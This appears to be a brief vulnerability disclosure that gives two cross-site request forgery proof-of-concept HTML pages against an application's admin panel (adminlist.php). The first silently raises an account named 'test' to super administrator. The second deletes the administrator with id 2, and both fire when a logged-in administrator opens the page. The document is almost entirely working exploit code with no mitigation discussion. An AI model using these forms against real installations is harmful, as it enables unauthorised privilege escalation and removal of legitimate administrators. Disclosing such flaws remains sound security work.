## CSRF
After the administrator logged in, open the following page poc：

one.html---General Management Upgraded to Super Administrator
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.1.108/admin/adminlist.php?do=modify" method="POST">
      <input type="hidden" name="admins" value="test" />
      <input type="hidden" name="groupid" value="1" />
      <input type="hidden" name="Submit" value="ä&#191;&#157;å&#173;&#152;" />
      <input type="hidden" name="action" value="modify" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
two.html---Delete an Administrator
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.1.108/admin/adminlist.php">
      <input type="hidden" name="action" value="del" />
      <input type="hidden" name="id" value="2" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
